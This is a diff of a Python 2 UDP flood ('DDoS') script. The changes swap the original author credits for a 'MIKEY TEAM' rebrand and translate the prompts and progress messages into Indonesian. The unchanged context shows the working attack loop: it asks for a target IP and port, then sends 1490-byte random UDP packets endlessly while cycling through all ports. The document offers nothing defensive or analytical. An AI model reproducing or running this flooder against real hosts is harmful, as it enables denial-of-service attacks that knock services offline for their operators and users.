@@ -18,18 +18,19 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet DDOS ATTACK")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : MIKEY TEAM"
+print "You Tube : 404 NOT FOUND"
+print "github   : https://github.com/bimaganz78"
+print "Facebook : 404 NOT FOUND"
+print "CREDITS BY : HA-MRX"
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input("IP TARGET : ")
+port = input("PORT       : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet Memulai Serangan")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -45,7 +46,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Mengirim Serangan %s ke %s melalui port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
